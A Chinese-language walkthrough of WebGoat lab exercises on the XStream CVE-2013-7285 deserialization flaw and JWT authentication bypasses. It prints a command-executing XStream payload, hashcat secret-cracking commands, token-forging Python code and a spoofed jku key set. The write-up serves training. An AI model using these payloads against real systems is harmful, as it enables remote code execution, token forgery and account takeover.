# （三）A6-漏洞组件 & A7-身份认证 & A8

## 1 漏洞组件

### 1.1 上来就过的

大概就是1.12会弹出这个提示，但是？这个我的输入有什么关系吗？
不理解

![](../images/Pasted%20image%2020241203110555.png)

### 1.2 CVE-2013-7285 (XStream)

#### 1.2.1 复现环境配置

先随便试试，大概之后要修改xml来干点什么？

![](../images/Pasted%20image%2020241203111629.png)

> 看到了似乎有用的
> https://loli.fj.cn/2024/04/25/CVE-2013-7285%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/#%E5%AE%8C%E6%88%90


```xml
<sorted-set>
    <string>foo</string>
    <dynamic-proxy>
        <interface>java.lang.Comparable</interface>
        <handler class="java.beans.EventHandler">
            <target class="java.lang.ProcessBuilder">
                <command>
                    <string><<command>></string>
                </command>
            </target>
            <action>start</action>
        </handler>
    </dynamic-proxy>
</sorted-set>
```

直接贴上去看看

![](../images/Pasted%20image%2020241203113529.png)

试图用java自己搞一个环境
一直在报错！

如果只报 `java.lang.ExceptionInInitializerError at com.thoughtworks.xstream.XStream.setupConverters`
那就是pom没写依赖

> 1.4.7修复了这个安全漏洞，需要使用1.4.6复现
> https://github.com/WebGoat/WebGoat/issues/725
> 

```xml
<dependency>  
    <groupId>com.thoughtworks.xstream</groupId>  
    <artifactId>xstream</artifactId>  
    <version>1.4.6</version> <!-- 请检查最新版本 -->  
</dependency>
```

如果还报`Unable to make field private final java.util.Comparator java.util.TreeMap.comparator accessible`
那就是jdk版本太高了不兼容，要改成jdk1.8 

> jdk1.8不用登录的下载链接
> https://docs.aws.amazon.com/corretto/latest/corretto-8-ug/downloads-list.html

终于能跑代码了

#### 1.2.2 Contact接口反序列化

首先复现一下代码，创建一个Contact接口拿来fromXML

```java
public interface Contact {  
    String getName();  
    String getEmail();  
}
```

```java
String line;  
String payload = "";  
  
// 逐行读取文件内容并输出  
FileInputStream fis = new FileInputStream("payload.xml");  
InputStreamReader isr = new InputStreamReader(fis);  
BufferedReader br = new BufferedReader(isr);  
while ((line = br.readLine()) != null) {  
    payload = payload + line;  
}  
System.out.println(payload);  
  
//payload = "<contact><name>John Doe</name><email>john.doe@example.com</email></contact>";  
  
XStream xstream = new XStream();  
xstream.setClassLoader(ContactImpl.class.getClassLoader());  
xstream.alias("contact", ContactImpl.class);  
xstream.ignoreUnknownElements(); // 忽略未知元素  
  
Contact contact = null;  
  
// 清理 payload 字符串  
if (!StringUtils.isEmpty(payload)) {  
    payload = payload.replace("+", "")  
            .replace("\r", "")  
            .replace("\n", "")  
            .replace("> ", ">")  
            .replace(" <", "<");  
}  
  
// 从 XML 反序列化为 Contact 对象  
contact = (Contact) xstream.fromXML(payload);  
// 输出结果  
System.out.println("Name: " + contact.getName());  
System.out.println("Email: " + contact.getEmail());
```

正常使用的xml：
```xml
<contact>  
    <name>John Doe</name>
    <email>john.doe@example.com</email>  
</contact>
```

对于这个代码，可以成功的命令执行
```xml
<contact class='dynamic-proxy'>  
    <interface>Contact</interface>  
    <handler class='java.beans.EventHandler'>  
        <target class='java.lang.ProcessBuilder'>  
            <command>                
            <string>calc</string>  
            </command>        
        </target>        
        <action>start</action>  
    </handler>
    <name>John Doe</name>
    <email>john.doe@example.com</email>  
</contact>
```

我理解大概是本来应该转换出一个Contact出来，Poc的xml则是转成了一个 com.sun.proxy动态代理
当动态代理的接口Contact调用时则触发handle，那如果注册的接口是其他的呢

![](../images/Pasted%20image%2020241204103737.png)

很可惜，就算把监听接口改成其他的，这个转换出来的类直接无法给contact，不仅无法使用Contact的函数了，并且后续也无法触发了
![](../images/Pasted%20image%2020241204104855.png)

如果换成ContactImpl也一样无法触发
![](../images/Pasted%20image%2020241204115346.png)

也就是接受返回的必须是一个接口，并且监听的必须是这个接口，才能赋值成功

#### 1.2.3 正常Proxy动态代理序列化

那么一个正常的proxy类应该长什么样子呢

> 动态代理参考：
> https://blog.csdn.net/zhaoyanjun6/article/details/125835341

```java
public interface Student {  
	String getName();  
	void setName(String name);  
	int getAge();   
	void setAge(int age);  
	String getStudentId();  
	void setStudentId(String studentId);  
	void morning(String name);  
}
```

```java
InvocationHandler handler = new InvocationHandler() {  
    @Override  
    public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {  
        System.out.println(method);  
        if (method.getName().equals("morning")) {  
            System.out.println("Good morning, student!");  
        }  
        return null;  
    }  
};  
Student student0 = (Student) Proxy.newProxyInstance(  
        Student.class.getClassLoader(), // 传入ClassLoader  
        new Class[] { Student.class }, // 传入要实现的接口  
        handler); // 传入处理调用方法的InvocationHandler  
student0.morning("Bob");

XStream xstream = new XStream();  
xstream.setClassLoader(ContactImpl.class.getClassLoader());  
xstream.alias("contact", ContactImpl.class);  
xstream.ignoreUnknownElements(); // 忽略未知元素  
  
System.out.println(xstream.toXML(student0));
```
输出
![](../images/Pasted%20image%2020241204113731.png)


大概理解？这里的Student实际上也是Proxy，当Student调用任何函数时，就会触发Main里定义的handler，无论如何都会输出一遍method，并根据method输出morning

动态代理用途：
动态代理允许将接口的实现与其使用分离。这种解耦使得代码更加灵活，可以在不修改客户端代码的情况下更改实现。
通过动态代理，您可以在调用实际方法之前或之后添加额外的逻辑，例如：
- **日志记录**：在方法调用前后记录日志。
- **权限检查**：在执行方法之前检查用户权限。
- **事务管理**：在方法调用前开始事务，在方法调用后提交或回滚事务。
这种增强功能通常在 AOP（面向切面编程）中使用，动态代理是实现 AOP 的一种常见方式。

而这个漏洞实际上是利用了Proxy的反序列化，搞出来一个这样类，赋值给监听的接口，于是后续该接口调用函数时就会触发漏洞
![](../images/Pasted%20image%2020241204135444.png)

至于网上使用`<sorted-set>`这样的写法是方便写这个触发的接口
让类不用赋值出去，在fromXml的调用链里就进行了比较，直接就能触发

> 
> 搜到的很好的参考 https://blog.csdn.net/Xxy605/article/details/126297121
> 一看id竟然还是认识的
> ![](../images/Pasted%20image%2020241204105018.png)

#### 1.2.4 答案

总之扯远了，关于本题触发可以写，命令行运行不成功也可以过（
```xml
<contact class='dynamic-proxy'>  
    <interface>org.owasp.webgoat.lessons.vulnerablecomponents.Contact</interface>  
    <handler class='java.beans.EventHandler'>  
        <target class='java.lang.ProcessBuilder'>  
            <command>                
	            <string>calc</string>  
            </command>        
        </target>        
        <action>start</action>  
    </handler>
</contact>  
```

> [!todo] 
>  按理来说应该分析一下调用链，找到根因函数，再看一下后续漏洞的修复与继续利用
>  emmm感觉有点难，还是先把靶场打完吧
>  放一些后续可能用到的链接
>  http://www.mi1k7ea.com/2019/10/21/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/


# 2 身份认证

#### 2.1 修改参数绕过

看起来把参数删了就可以
![](../images/Pasted%20image%2020241204141511.png)

但并不行，提示说和讲的案例不一样
![](../images/Pasted%20image%2020241204143214.png)

一开始换参数名不知道为什么没过
总之去看了源码，自己写了一下试试，原理就是这样
包含secQuestion就会被放进去
![](../images/Pasted%20image%2020241204143757.png)

```java
public class Main {  
    private static final Integer verifyUserId = 1223445;  
    private static final Map<String, String> userSecQuestions = new HashMap();  
    private static final Map<Integer, Map> secQuestionStore;  
  
    static {  
        userSecQuestions.put("secQuestion0", "Dr. Watson");  
        userSecQuestions.put("secQuestion1", "Baker Street");  
        secQuestionStore = new HashMap();  
        secQuestionStore.put(verifyUserId, userSecQuestions);  
    }  
  
    public static void main(String[] args) {  
  
        HashMap<String, String> submittedQuestions= new HashMap<>();  
        submittedQuestions.put("secQuestion3", "111");  
        submittedQuestions.put("secQuestion4", "222");  
  
        if (submittedQuestions.entrySet().size() != ((Map)secQuestionStore.get(verifyUserId)).size()) {  
            System.out.println("size false");  
        } else if (submittedQuestions.containsKey("secQuestion0") && !((String)submittedQuestions.get("secQuestion0")).equals(((Map)secQuestionStore.get(verifyUserId)).get("secQuestion0"))) {  
            System.out.println("secQuestion0 false");  
        } else if (!submittedQuestions.containsKey("secQuestion1") || ((String)submittedQuestions.get("secQuestion1")).equals(((Map)secQuestionStore.get(verifyUserId)).get("secQuestion1"))){  
            System.out.println("true");  
        } else {  
            System.out.println("secQuestion1 false");  
        }  
    }  
}
```


![](../images/Pasted%20image%2020241204143157.png)
这样也行
![](../images/Pasted%20image%2020241204143931.png)

### 2.2 抓包看账号密码

就是抓个包看账号密码
![](../images/Pasted%20image%2020241204144547.png)

### 2.3 JWT令牌

> [!note] 
> 可以安装burp的JWT Editor插件
> ![](../images/Pasted%20image%2020241210165746.png)

![](../images/Pasted%20image%2020241204151941.png)
对每段解码，直接就能获得用户名

#### 2.3.1 解析jwt

下一题投票

guest access_token=""

Tom
```
eyJhbGciOiJIUzUxMiJ9.eyJpYXQiOjE3MzQxMjE3NTIsImFkbWluIjoiZmFsc2UiLCJ1c2VyIjoiVG9tIn0.M4s-DHd2xdjCVLgsnK5ophnrzxYNsJV2ET06mmQ7yzi7VqSdO_kEkbajkvrZ9G5yYZ9yTV8FsVyaF-6dQnwEgA
```

Jerry
```
eyJhbGciOiJIUzUxMiJ9.eyJpYXQiOjE3MzQxMjI0NTQsImFkbWluIjoiZmFsc2UiLCJ1c2VyIjoiSmVycnkifQ.5UMXheXVy0dGaDEuWHGAyF0Vw8X6cqDlkaIC8v67QsyJbtJ_eASH0Pdf-lzsv48aU9wrFiiOuWwBjjMWCtw7qw
```

中间的直接转会报错，问了gpt，让我补位`==`，就可以了。谢谢gpt
![](../images/Pasted%20image%2020241204153708.png)

头是一样的
`eyJpYXQiOjE3MzQxMjI0NTQsImFkbWluIjoiZmFsc2UiLCJ1c2VyIjoiSmVycnkifQ==`对应
`{"iat":1734122454,"admin":"false","user":"Jerry"}`
改成admin是true
`eyJpYXQiOjE3MzQxMjI0NTQsImFkbWluIjoidHJ1ZSIsInVzZXIiOiJKZXJyeSJ9Cg==`

```
eyJhbGciOiJIUzUxMiJ9.eyJpYXQiOjE3MzQxMjI0NTQsImFkbWluIjoidHJ1ZSIsInVzZXIiOiJKZXJyeSJ9Cg.5UMXheXVy0dGaDEuWHGAyF0Vw8X6cqDlkaIC8v67QsyJbtJ_eASH0Pdf-lzsv48aU9wrFiiOuWwBjjMWCtw7qw
```
![](../images/Pasted%20image%2020241204154232.png)

直接就显示OK，但是并没有变化emmmmm
哦哦原来要点那个删除的按钮，这回可以看到token格式不对了
![](../images/Pasted%20image%2020241204154728.png)

#### 2.3.2 改签名：算法None

接下来要改签名，直接搜没看到什么暴力破解
倒是有算法改none的
![](../images/Pasted%20image%2020241204163724.png)

使用从`base64.b64encode(b'{"alg":"none"}')` 转换的`eyJhbGciOiJub25lIn0`，以及改后的中间部分

```python
def jwtdecoder(secret_key, token):  
    try:  
        # 校验 JWT        
        decoded = jwt.decode(token, secret_key, options={"verify_signature": False})  
        print("JWT is valid. Decoded payload:")  
        print(decoded)  
    except jwt.ExpiredSignatureError:  
        print("JWT has expired.")  
    except jwt.InvalidTokenError:  
        print("JWT is invalid.")

token = ("eyJhbGciOiJub25lIn0.eyJpYXQiOjE3MzQxMjI0NTQsImFkbWluIjoidHJ1ZSIsInVzZXIiOiJKZXJyeSJ9Cg."  
         "5UMXheXVy0dGaDEuWHGAyF0Vw8X6cqDlkaIC8v67QsyJbtJ_eASH0Pdf-lzsv48aU9wrFiiOuWwBjjMWCtw7qw")
jwtdecoder(secret_key, token)
```

这个是可以解出来的，但是，发包过去并不行
![](../images/Pasted%20image%2020241204163935.png)
看来还是要爆破出来密钥？

补充：后面看了题解其实这个应该可以的，应该是我没有加.所以说格式不对
比如这样写：
`eyJhbGciOiJub25lIn0.eyJpYXQiOjE3MzQxMzU3MDYsImFkbWluIjoidHJ1ZSIsInVzZXIiOiJKZXJyeSJ9.`

#### 2.3.3 爆破密码

想到之前用hashcat爆破hash ，于是问gpt命令，gpt说对了一半，但告诉我要用:分隔，于是得到了这样的报错
![](../images/Pasted%20image%2020241204165652.png)

> 应该使用的参考：
> hashcat支持的所有模式 https://hashcat.net/forum/thread-9854.html
> 16500 jwt模式使用 https://hashcat.net/forum/thread-10787.html

```shell
hashcat -m 16500 -a 0 eyJhbGciOiJIUzUxMiJ9.eyJpYXQiOjE3MzQxMjI0NTQsImFkbWluIjoiZmFsc2UiLCJ1c2VyIjoiSmVycnkifQ:5UMXheXVy0dGaDEuWHGAyF0Vw8X6cqDlkaIC8v67QsyJbtJ_eASH0Pdf-lzsv48aU9wrFiiOuWwBjjMWCtw7qw /usr/share/wordlists/rockyou.txt
```

很快就出来了密钥

![](../images/Pasted%20image%2020241204165716.png)

#### 2.3.4 最新时间戳

这次

![](../images/Pasted%20image%2020241204174655.png)

原来是时间戳的问题
![](../images/Pasted%20image%2020241204175200.png)

再次测试的时候又server error了，这次是因为中间段多了\n

放一下代码，时间戳是根据测试算出来的
系统提供的jwt.encode的header总是还有一条，和这个不一样，只好自己实现一个加密解密

```python
import jwt  
import hmac  
import hashlib  
import base64  
import datetime  
import json  
  
def base64url_encode(data):  
    """Base64 URL 编码"""  
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode('utf-8')  
  
def base64url_decode(data):  
    """Base64 URL 解码"""  
    padding = '=' * (4 - len(data) % 4)  # 添加必要的填充  
    print("decode:", data + padding.encode('utf-8'))  
    return base64.urlsafe_b64decode(data + padding.encode('utf-8'))  
  
def generate_token(secret_key, header, payload):  
    head_str = json.dumps(header).replace(" ", "")  
    payload_str = json.dumps(payload).replace(" ", "")  
    print(head_str.encode('utf-8'))  
    print(payload_str.encode('utf-8'))  
    # 编码头部和有效载荷  
    encoded_header = base64url_encode(head_str.encode('utf-8'))  
    encoded_payload = base64url_encode(payload_str.encode('utf-8'))  
  
    # 创建签名  
    signature = hmac.new(secret_key.encode('utf-8'), f"{encoded_header}.{encoded_payload}".encode('utf-8'), hashlib.sha512).digest()  
    encoded_signature = base64url_encode(signature)  
  
    # 生成 JWT    token = f"{encoded_header}.{encoded_payload}.{encoded_signature}"  
    return token  
  
def decode_token(secret_key, token):  
    # 分割 JWT    encoded_header, encoded_payload, encoded_signature = token.split('.')  
  
    # 验证签名  
    signature = hmac.new(secret_key.encode('utf-8'), f"{encoded_header}.{encoded_payload}".encode('utf-8'),  
                         hashlib.sha512).digest()  
    expected_signature = base64url_encode(signature)  
  
    if not hmac.compare_digest(encoded_signature, expected_signature):  
        raise ValueError("Invalid signature")  
  
    print("expected_signature successfully")  
    # 解码有效载荷  
    payload = json.loads(base64url_decode(encoded_payload.encode('utf-8')).decode('utf-8'))  
  
    # 检查过期时间  
    if 'exp' in payload and datetime.datetime.utcnow() > datetime.datetime.fromtimestamp(payload['exp']):  
        raise ValueError("Token has expired")  
  
    return payload

payload = {"iat": int(datetime.datetime.now(datetime.timezone.utc).timestamp()) + 824770 , "admin": "true", "user": "Jerry"}
secret_key = "victory"
head512 = {"alg": "HS512"}
token = generate_token(secret_key, head512, payload)  
print(token)

```


再生成一段算法为None的看看，也是可以的
（其实这个才是这道题的标准题解）
![](../images/Pasted%20image%2020241204191606.png)

### 2.4 问答

### 绕过BUG 看不到问答题(2)

这个问答题在旧版本没有
只好自己找题了

![](../images/Pasted%20image%2020241204194832.png)

构造一下包的内容

样例：
```
question_0_solution=Solution+2%3A+Invoked+the+method+removeAllUsers+at+line+7&
question_1_solution=Solution+1%3A+Throws+an+exception+in+line+12
```

三个选项：
```
Solution+1%3A+Throws+an+exception+in+line+12
Solution+2%3A+Invoked+the+method+removeAllUsers+at+line+7
Solution+3%3A+Logs+an+error+in+line+9
```


![](../images/Pasted%20image%2020241204195557.png)
看起来没问题，还可以马上发包看一下结果

经过测试这个是有变化的！很好
![](../images/Pasted%20image%2020241204200428.png)
![](../images/Pasted%20image%2020241204200615.png)

可以做题了
根据题目两个代码块的区别是
`Jwt jwt = Jwts.parser().setSigningKey(JWT_PASSWORD).parseClaimsJws(accessToken);`
1会验证签名
`Jwt jwt = Jwts.parser().setSigningKey(JWT_PASSWORD).parse(accessToken);`
2不验证

第一题选报错，第2题选正确调用
ok
![](../images/Pasted%20image%2020241204200738.png)

### 2.5 JWT令牌破解

给的令牌

```
eyJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJXZWJHb2F0IFRva2VuIEJ1aWxkZXIiLCJhdWQiOiJ3ZWJnb2F0Lm9yZyIsImlhdCI6MTczMzI3MjY5NCwiZXhwIjoxNzMzMjcyNzU0LCJzdWIiOiJ0b21Ad2ViZ29hdC5vcmciLCJ1c2VybmFtZSI6IlRvbSIsIkVtYWlsIjoidG9tQHdlYmdvYXQub3JnIiwiUm9sZSI6WyJNYW5hZ2VyIiwiUHJvamVjdCBBZG1pbmlzdHJhdG9yIl19.h1puAT9Q6Suwip5l1Z8XBDTTFXg-G97CCmpR8aH3r9U

```

刚刚就爆破了密码，这次还是和上一次一样

看一下令牌信息
![](../images/Pasted%20image%2020241205101702.png)

使用的是HS256，信息需要改用户名为webgoat

```
{"iss":"WebGoat Token Builder","aud":"webgoat.org","iat":1733272694,"exp":1733272754,"sub":"tom@webgoat.org","username":"WebGoat","Email":"tom@webgoat.org","Role":["Manager","Project Administrator"]}
```

破解命令

```shell
hashcat -m 16500 -a 0 eyJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJXZWJHb2F0IFRva2VuIEJ1aWxkZXIiLCJhdWQiOiJ3ZWJnb2F0Lm9yZyIsImlhdCI6MTczMzI3MjY5NCwiZXhwIjoxNzMzMjcyNzU0LCJzdWIiOiJ0b21Ad2ViZ29hdC5vcmciLCJ1c2VybmFtZSI6IlRvbSIsIkVtYWlsIjoidG9tQHdlYmdvYXQub3JnIiwiUm9sZSI6WyJNYW5hZ2VyIiwiUHJvamVjdCBBZG1pbmlzdHJhdG9yIl19.h1puAT9Q6Suwip5l1Z8XBDTTFXg-G97CCmpR8aH3r9U /usr/share/wordlists/rockyou.txt
```

![](../images/Pasted%20image%2020241205101954.png)

密钥是`washington`

解出来的jwt还是要求时间戳
![](../images/Pasted%20image%2020241205102624.png)

修改一下时间戳iat和过期时间exp就可以了

最后使用的代码


```python
def generate_token(secret_key, header, payload):  
    alg_str = header.get('alg')  
    print(alg_str)  
    head_str = json.dumps(header).replace(" ", "")  
    payload_str = json.dumps(payload).replace(" ", "")  
    print(head_str.encode('utf-8'))  
    print(payload_str.encode('utf-8'))  
    # 编码头部和有效载荷  
    encoded_header = base64url_encode(head_str.encode('utf-8'))  
    encoded_payload = base64url_encode(payload_str.encode('utf-8'))  
  
    # 创建签名  
    if alg_str == 'HS256':  
        signature = hmac.new(secret_key.encode('utf-8'), f"{encoded_header}.{encoded_payload}".encode('utf-8'), hashlib.sha256).digest()  
    else:  
        signature = hmac.new(secret_key.encode('utf-8'), f"{encoded_header}.{encoded_payload}".encode('utf-8'), hashlib.sha512).digest()  
  
    encoded_signature = base64url_encode(signature)  
    token = f"{encoded_header}.{encoded_payload}.{encoded_signature}"  
    return token

payload = {"iss":"WebGoat Token Builder","aud":"webgoat.org","iat":int(datetime.datetime.now(datetime.timezone.utc).timestamp()) + 824770,"exp":int(datetime.datetime.now(datetime.timezone.utc).timestamp()) + 825770,"sub":"tom@webgoat.org","username":"WebGoat","Email":"tom@webgoat.org","Role":["Manager","Project Administrator"]}
secret_key = "washington"
head256 = {"alg": "HS256"}

token = generate_token(secret_key, head256, payload)  
print(token)
```

### 2.6 刷新令牌

#### 2.6.1 基本信息

![](../images/Pasted%20image%2020241205103250.png)

漏洞的介绍大概是，访问令牌过期用刷新令牌刷新，但是刷新时没有校验这两个令牌是否属于同一个人
于是出现了用测试刷新令牌刷新实际用户的过期访问令牌，拿到了实际用户最新的访问令牌

日志文件
```log
194.201.170.15 - - [28/Jan/2016:21:28:01 +0100] "GET /JWT/refresh/checkout?token=eyJhbGciOiJIUzUxMiJ9.eyJpYXQiOjE1MjYxMzE0MTEsImV4cCI6MTUyNjIxNzgxMSwiYWRtaW4iOiJmYWxzZSIsInVzZXIiOiJUb20ifQ.DCoaq9zQkyDH25EcVWKcdbyVfUL4c9D4jRvsqOqvi9iAd4QuqmKcchfbU8FNzeBNF9tLeFXHZLU4yRkq-bjm7Q HTTP/1.1" 401 242 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0" "-"
194.201.170.15 - - [28/Jan/2016:21:28:01 +0100] "POST /JWT/refresh/moveToCheckout HTTP/1.1" 200 12783 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0" "-"
194.201.170.15 - - [28/Jan/2016:21:28:01 +0100] "POST /JWT/refresh/login HTTP/1.1" 200 212 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0" "-"
194.201.170.15 - - [28/Jan/2016:21:28:01 +0100] "GET /JWT/refresh/addItems HTTP/1.1" 404 249 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0" "-"
195.206.170.15 - - [28/Jan/2016:21:28:01 +0100] "POST /JWT/refresh/moveToCheckout HTTP/1.1" 404 215 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36" "-"
```

看起来有一个token
```
eyJhbGciOiJIUzUxMiJ9.eyJpYXQiOjE1MjYxMzE0MTEsImV4cCI6MTUyNjIxNzgxMSwiYWRtaW4iOiJmYWxzZSIsInVzZXIiOiJUb20ifQ.DCoaq9zQkyDH25EcVWKcdbyVfUL4c9D4jRvsqOqvi9iAd4QuqmKcchfbU8FNzeBNF9tLeFXHZLU4yRkq-bjm7Q
```

算法是HS512，信息是
```
{"iat":1526131411,"exp":1526217811,"admin":"false","user":"Tom"}
```

也许我可以拿我的刷新令牌，刷新这个Tom的令牌，然后用Tom的新令牌干事情

刷新了一下页面，抓到了一个jerry的登录包
![](../images/Pasted%20image%2020241205104429.png)

刷新令牌是
```
NDcaPxlpQdAkoSArYKgA
```

试一下checkout用Tom旧令牌
![](../images/Pasted%20image%2020241205104947.png)

看来是在login刷新？
每次login，刷新令牌似乎都会变
![](../images/Pasted%20image%2020241205105121.png)
试一下
好像返回的还是Jerry的
![](../images/Pasted%20image%2020241205105236.png)

看不懂了，这也没有其他接口了啊

#### 2.6.2 newToken接口

看了一下源码
![](../images/Pasted%20image%2020241205110313.png)

看起来有戏
![](../images/Pasted%20image%2020241205110549.png)

需要最新的刷新令牌和登录状态
![](../images/Pasted%20image%2020241205110700.png)

试试Tom的登录
返回了新的令牌
![](../images/Pasted%20image%2020241205110819.png)

用这个令牌去checkout，就ok了
![](../images/Pasted%20image%2020241205110854.png)

#### 2.6.3 如果用密钥

去看了题解，竟然没有用刷新令牌？好吧，让我去看看能不能爆破出来密钥
![](../images/Pasted%20image%2020241205111021.png)


```shell
hashcat -m 16500 -a 0 eyJhbGciOiJIUzUxMiJ9.eyJhZG1pbiI6ImZhbHNlIiwidXNlciI6IlRvbSJ9.a4yUoDOuv6L7ICs-HsE6craLHG_u6YDTkmXiGHjF7GdJZVZWCTurWBBunW9ujab8f4vNG31XAEvWYUEmAt0SGg /usr/share/wordlists/rockyou.txt
```

这个爆破不出来

于是去看了源码，把这个加在了字典文件里
![](../images/Pasted%20image%2020241205140111.png)

结果发现还是不行，自己写的python跑出来的Token签名也不一样
调了好久发现，这个密钥是Base64加密的
之前的用法是
![](../images/Pasted%20image%2020241205140318.png)

也就是java的API传入的就是base64加密的密钥

```java
Map<String, Object> claims = new HashMap<>();  
claims.put("admin", "false");  
claims.put("user", "Tom");
String token0 = Jwts.builder()  
        .setClaims(claims)  
        .signWith(SignatureAlgorithm.HS512, TextCodec.BASE64.encode("victory"))
        
String token1 = Jwts.builder()  
        //.setIssuedAt(new Date(System.currentTimeMillis() + TimeUnit.DAYS.toDays(10L)))  
        .setClaims(claims)  
        .signWith(io.jsonwebtoken.SignatureAlgorithm.HS512, "bm5n3SkxCX4kKRy4")  
        .compact();
```

把这个的密钥原文加进去就可以爆破出来了

```shell
echo "bm5n3SkxCX4kKRy4" | base64 --decode >> /usr/share/wordlists/rockyou.txt
```

![](../images/Pasted%20image%2020241205140646.png)

### 2.7 删除Tom的账户

#### 2.7.1 正确的接口

![](../images/Pasted%20image%2020241205141615.png)

无论点哪个delete都是
![](../images/Pasted%20image%2020241205141632.png)

那么分析一下Token

```
eyJ0eXAiOiJKV1QiLCJqa3UiOiJodHRwczovL2NvZ25pdG8taWRwLnVzLWVhc3QtMS5hbWF6b25hd3MuY29tL3dlYmdvYXQvLndlbGwta25vd24vandrcy5qc29uIiwiYWxnIjoiUlMyNTYifQ.eyJpc3MiOiJXZWJHb2F0IFRva2VuIEJ1aWxkZXIiLCJpYXQiOjE1MjQyMTA5MDQsImV4cCI6MTYxODkwNTMwNCwiYXVkIjoid2ViZ29hdC5vcmciLCJzdWIiOiJqZXJyeUB3ZWJnb2F0LmNvbSIsInVzZXJuYW1lIjoiSmVycnkiLCJFbWFpbCI6ImplcnJ5QHdlYmdvYXQuY29tIiwiUm9sZSI6WyJDYXQiXX0.SabvRaYSCW7xI0ueca19TL1e66cJIJaxRiydK2G5lgFMIbL5gQQjE6022HEha9HcprqFXyHbtXrQWRXAp6Gjaf5zs8LUMBMARWjEr8TS43ihguarmLLmvBCoqjiZY39o4EcEjEH9xAoyIYR_Trh7kXn6JVU-8MM76l9IOcYIJ9c8LqT1ERNmbCqtI4PP0tdqCy99nHhqlxSCVXaGDF0jMHV5kjCDSHNYib9riy9xZ63Sztify-bwPqRvxmaShPYtG4BBM_wOGlg-BYTTuws-6yISMfTB5U1WBDwLr6dLU123TGO26wCVBgTKbA0KKG94-ToOcneWLOTEacEfQQOlIQ
```

头是
```
{"typ":"JWT","jku":"https://cognito-idp.us-east-1.amazonaws.com/webgoat/.well-known/jwks.json","alg":"RS256"}
```

有效载荷是
```
{"iss":"WebGoat Token Builder","iat":1524210904,"exp":1618905304,"aud":"webgoat.org","sub":"jerry@webgoat.com","username":"Jerry","Email":"jerry@webgoat.com","Role":["Cat"]}
```
为什么Jerry的角色是只猫emmm

> 路径是不正确的
> https://github.com/WebGoat/WebGoat/issues/1715
> ![](../images/Pasted%20image%2020241205145731.png)
> 怎么看都应该是POST /WebGoat/JWT/jku/delete

#### 2.7.2 创造一个jku

但是这里还有问题
![](../images/Pasted%20image%2020241205145758.png)

直接访问 https://cognito-idp.us-east-1.amazonaws.com/webgoat/.well-known/jwks.json 会提示
![](../images/Pasted%20image%2020241205145828.png)

gpt解释这个用户池ID不对
![](../images/Pasted%20image%2020241205145924.png)

但是加了下划线还是有问题
![](../images/Pasted%20image%2020241205145953.png)

理解一下大概是AWS Cognito提供一个免费的jku的生成
但是AWS的注册竟然还要我填信用卡太离谱了（
总之没研究出来怎么快速使用这个
![](../images/Pasted%20image%2020241210164447.png)

于是想到换一个这样的服务器
正好搜到了类似的靶场参考
https://blog.csdn.net/2401_84166147/article/details/137851539
感谢这个参考！还让我安装了burp的Jwt插件！太好用了
总之这里用了靶场自带的一个地址生成
![](../images/Pasted%20image%2020241210164835.png)
但是，这个网址是外网，我的虚拟机访问不了
不过我知道了jku返回包的格式，于是我可以自己构建的一个
用插件生成一个RSA key
![](../images/Pasted%20image%2020241210165028.png)

直接开启tomcat服务器，在目录下创建一个test.json
```json
{ "keys": [ { "kty": "RSA", "e": "AQAB", "kid": "fcdb33b7-da97-4bd2-bec8-512f7176d7e0", "n": "4Bgsn-gjNheO9EmKePO0HwNZoSmq-eT6Njukd0V5H1JSsBM5jGf9e52CDGKjgGYDuscBhqPHNvPDKDrZcMZQl5-Zk0tpFRZtZkerccCjNwB0x9Z0HDwK9UlR4vnH9ZV01phrGAXIDS8kXhg2BUmwQJyCh9VHGe9Od9yfp81wnVOnjD0Zo0e9rrPqDKIBHa7kkKnwX8tYLTV4xiKz50qjObG5rSye6XYgLZLsFvfLAV_P83VJgljnuDhQB91I6GeDzxZS4h4bB_WvleJ2QfJMeVHeLjip7yDUejCN37kZXf5EOc6hT2ZBwoWoYG095dHD-ibCqANwXp8B7nZdonsLJQ" } ] }
```

也就是
```
{"typ":"JWT","jku":"http://192.168.137.1:8080/test.json","alg":"RS256"}
```

#### 2.7.3 签名

理解一下RS256
大概是使用RSA的私钥进行SH256的签名，公钥放在url中，由服务器访问进行签名校验
本来还要写一个签名，结果发现这个插件自带的JSON Web Token这个，直接解析包里的jwt，太好用了

直接在这里改然后签名，就可以发送了
需要改jku和iat,exp时间
![](../images/Pasted%20image%2020241210164134.png)

username改成Tom就通关了！
这个插件太好了，我要补充在前面
![](../images/Pasted%20image%2020241210165546.png)